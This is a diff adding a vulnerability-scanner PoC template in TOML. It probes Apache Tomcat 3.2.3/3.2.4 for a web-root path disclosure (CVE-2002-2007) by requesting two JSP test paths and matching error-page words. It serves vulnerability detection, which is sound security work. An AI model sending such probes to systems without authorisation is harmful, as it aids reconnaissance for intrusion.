@@ -1,0 +1,54 @@
+[info]
+author = "ave"
+description = "验证 Apache Tomcat 3.2.3/3.2.4 默认安装是否泄露 Web 根目录完整路径。通过向 test/jsp、samples/jsp、examples/jsp 目录发送错误 HTTP 请求，触发错误消息泄露路径信息。"
+id = "POC-AVE-2002-0744"
+name = "Apache Tomcat 路径信息泄露 PoC"
+severity = "medium"
+tags = ["ave-2002-0744"]
+vuln_id = [
+    "CVE-2002-2007",
+    "AVE-2002-0744",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/test/realPath.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "webapps",
+    "web_root",
+    "FileNotFound",
+    " Catalina ",
+    "tomcat",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/test/jsp/invalid.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "webapps",
+    "web_root",
+    "FileNotFound",
+    " Catalina ",
+    "tomcat",
+]
